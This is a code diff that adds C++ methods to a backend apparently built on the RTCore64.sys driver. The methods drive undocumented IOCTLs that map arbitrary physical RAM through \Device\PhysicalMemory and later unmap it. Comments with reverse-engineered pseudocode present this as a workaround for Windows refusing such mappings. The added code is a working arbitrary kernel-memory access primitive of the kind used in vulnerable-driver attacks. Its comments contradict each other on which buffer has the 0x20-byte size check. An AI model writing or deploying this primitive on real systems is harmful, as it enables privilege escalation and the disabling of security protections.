@@ -130,3 +130,78 @@ void RTCore64Backend::UnmapPhys(DWORD64 va, DWORD size) {
     DeviceIoControl(hDev, IOCTL_UNMAP_PHYS,
                     &req, sizeof(req), &req, sizeof(req), &n, nullptr);
 }
+
+// RTCore64 IOCTL 0x80002058 — map physical memory via \Device\PhysicalMemory.
+//
+// Unlike MapPhys (MmMapIoSpace, IOCTL 0x80002050), this uses ZwOpenSection +
+// ZwMapViewOfSection on \Device\PhysicalMemory, which CAN map RAM pages.
+// MmMapIoSpace refuses RAM pages on modern Windows — this is the workaround.
+//
+// Discovered via ppm-engine analysis of RTCore64.sys (2026-04-11):
+//   sub_1120: ZwOpenSection("\Device\PhysicalMemory") → HalTranslateBusAddress
+//            → ZwMapViewOfSection → returns mapped VA
+//
+// Input struct (from ppm dataflow at 0x1120):
+//   +0x00  QWORD  PhysAddr
+//   +0x08  DWORD  Size (minimum input buffer size check: >= 0x20)
+//   +0x0C  DWORD  _pad
+//   r8d = output buffer size (minimum: 8)
+// Output:
+//   Return value in IRP → Information field = 8 (bytes returned)
+//   The mapped VA is returned through sub_1120's internal logic.
+//
+// From the IOCTL dispatch pseudocode:
+//   r8d = edx;      // edx = output buffer size
+//   rdx = r10;      // r10 = input buffer pointer (SystemBuffer)
+//   sub_1120(r10, edx);
+//   if (eax >= 0) { rdi+0x38 = 8; }  // Information = 8 bytes
+//
+// sub_1120 reads:
+//   rbx = [rdi+0x00] = PhysAddr
+//   esi = [rdi+0x08] = Size for HalTranslateBusAddress
+// sub_1120 writes:
+//   [rsp+0x58] = mapped section size (computed internally)
+//   Return: mapped VA difference as output
+DWORD64 RTCore64Backend::MapPhysSection(DWORD64 pa, DWORD size) {
+    // sub_1120 analysis (ppm-engine, 2026-04-11):
+    //   Input:  [+0x00] QWORD PhysAddr, [+0x08] DWORD Size
+    //   Output: [+0x00] QWORD MappedVA  (overwrites PhysAddr)
+    //   Buffer size checks: OutputBufferLength >= 0x20, InputBufferLength >= 8
+    //   METHOD_BUFFERED: input and output share the same SystemBuffer
+    struct Req {
+        DWORD64 PhysAddr;       // +0x00  input: PA / output: mapped VA
+        DWORD   Size;           // +0x08  input: mapping size
+        DWORD   _pad;           // +0x0C
+        DWORD64 _pad2;          // +0x10
+        DWORD64 _pad3;          // +0x18
+    } req{};                    // total 0x20 = 32 bytes (meets >= 0x20 check)
+    static_assert(sizeof(Req) == 0x20, "MapPhysSection Req must be 0x20 bytes");
+    req.PhysAddr = pa;
+    req.Size     = size;
+
+    DWORD n = 0;
+    BOOL ok = DeviceIoControl(hDev, IOCTL_MAP_SECTION,
+                              &req, sizeof(req), &req, sizeof(req), &n, nullptr);
+    if (!ok)
+        return 0;
+
+    // Output: mapped VA is written back to [+0x00] (overwrites PhysAddr)
+    DWORD64 va = req.PhysAddr;
+    if (va && (va >> 48) == 0xFFFFULL)
+        return va;
+
+    return 0;
+}
+
+// RTCore64 IOCTL 0x8000205C — unmap a \Device\PhysicalMemory section view.
+// Internally calls ZwUnmapViewOfSection.
+void RTCore64Backend::UnmapPhysSection(DWORD64 va) {
+    struct Req {
+        DWORD64 VirtAddr;   // +0x00
+        DWORD64 _pad;       // +0x08
+    } req{};
+    req.VirtAddr = va;
+    DWORD n;
+    DeviceIoControl(hDev, IOCTL_UNMAP_SECTION,
+                    &req, sizeof(req), &req, sizeof(req), &n, nullptr);
+}
